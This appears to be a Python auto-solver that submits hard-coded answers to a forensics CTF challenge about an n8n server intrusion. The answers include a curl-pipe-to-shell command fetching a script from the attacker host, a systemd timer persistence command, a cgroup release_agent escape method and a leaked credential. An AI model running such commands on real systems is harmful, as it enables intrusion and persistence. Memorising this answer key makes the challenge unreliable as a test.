#!/usr/bin/env python3
"""
NexSec 2026 - n8n Forensics Auto-Solver
Author: Klasyyi
Repository: https://github.com/klasyyi/writeup-nexsec2026
"""

import socket
import sys
import time

ANSWERS = [
    ("1. Victim IP", "192.168.56.10"),
    ("2. Attacker IP", "192.168.56.107"),
    ("3. Open TCP ports", "22,5678"),
    ("4. App + version", "n8n 1.70.0"),
    ("5. Credentials used", "aisyah.rahman@acme.local:Password123"),
    ("6. Successful auth time", "10/10/2026 03:22:59"),
    ("7. RCE payload inserted", "10/10/2026 03:23:03"),
    ("8. Priv-esc script path", "/tmp/l.sh"),
    ("9. Capability enabling escape", "CAP_SYS_ADMIN"),
    ("10. Abused cgroup file", "release_agent"),
    ("11. Persistence sub-technique", "T1053.006"),
    ("12. Command activating persistence", "systemctl enable --now sysupdate.timer"),
    ("13. Implant XOR key", "K3rn3l_X0R_2026!"),
    ("14. Command sent back by C2", "curl -fsSL http://192.168.56.107:8080/s/update.sh | sh"),
]

def solve(host, port):
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    
    for idx, (desc, ans) in enumerate(ANSWERS):
        buf = ""
        while True:
            chunk = s.recv(1024).decode('utf-8', errors='replace')
            if not chunk:
                break
            buf += chunk
            sys.stdout.write(chunk)
            sys.stdout.flush()
            if any(p in buf for p in [": ", "? ", "> ", "answer", "Answer"]):
                break
            time.sleep(0.02)
            
        print(f"\n[+] Submitting answer #{idx+1} ({desc}): {ans}")
        s.sendall((ans + "\n").encode('utf-8'))
        time.sleep(0.15)
        
    print("\n[*] Reading final response...")
    while True:
        try:
            s.settimeout(4.0)
            chunk = s.recv(4096).decode('utf-8', errors='replace')
            if not chunk:
                break
            sys.stdout.write(chunk)
            sys.stdout.flush()
        except Exception:
            break
            
    s.close()
    print("\n[+] Verification Complete!")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: python {sys.argv[0]} <host> <port>")
        sys.exit(1)
    solve(sys.argv[1], sys.argv[2])
